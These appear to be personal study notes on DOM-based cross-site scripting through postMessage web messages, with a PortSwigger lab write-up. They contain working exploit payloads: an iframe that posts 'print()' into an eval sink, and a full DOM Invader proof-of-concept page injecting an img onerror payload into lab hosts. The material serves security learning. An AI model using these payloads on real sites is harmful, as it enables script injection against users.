# Controlling the web message source

- If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks. 
- For example, an attacker could host a malicious iframe and use the postMessage() method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. 
- This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks.

# What is the impact of DOM-based web message vulnerabilities?
- The potential impact of the vulnerability depends on the destination document's handling of the incoming message. 
- If the destination document trusts the sender not to transmit malicious data in the message, and handles the data in an unsafe way by passing it into a sink, then the joint behavior of the two documents may allow an attacker to compromise the user, for example.

# How to construct an attack using web messages as the source
- Consider the following code:
```
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
- This is vulnerable because an attacker could inject a JavaScript payload by constructing the following iframe:

```
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
- As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.


```
<iframe src="//0ab7003f03eb687b80c1039c0073001e.web-security-academy.net" onload="this.contentWindow.postMessage('print()','*')">
```

# Lab: DOM XSS using web messages
- This lab demonstrates a simple web message vulnerability. 
- To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.
- This lab was suppose to be easy for me, but I coud not solve it
- So I made used of DOM invader and I noticed that the contecxt was div
- So in the DOM invader, I inserted this ```img src='x' onerror='(print())'
- So Dom invader gave me the following payload  
```
        <!doctype html>
        <html>
            <head>
                <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
                <meta charset="UTF-8" />
                <title>Postmessage PoC</title>
                <script>
                    function pocLink() {
                        let win = window.open('https://0a84003b034f453c82827efb00d70013.web-security-academy.net/');
                        let msg = "u1kjte2o0-\\\u003c\u003e'\":\u003cimg src='x' onerror='print()'\u003e";
                        
                        setTimeout(function(){
                            win.postMessage(msg, '*');
                        }, 5000);
                    }
                    function pocFrame(win) {           
                        let msg = "u1kjte2o0-\\\u003c\u003e'\":\u003cimg src='x' onerror='print()'\u003e";
                        
                        win.postMessage(msg, '*');          
                    }
                </script>
            </head>
            <body>
                <a href="#" onclick="pocLink();">PoC link</a>          
                <iframe src="https://0a84003b034f453c82827efb00d70013.web-security-academy.net/" onload="pocFrame(this.contentWindow)"></iframe>                    
            </body>
        </html>
```
- The lab was solved on delevering to victim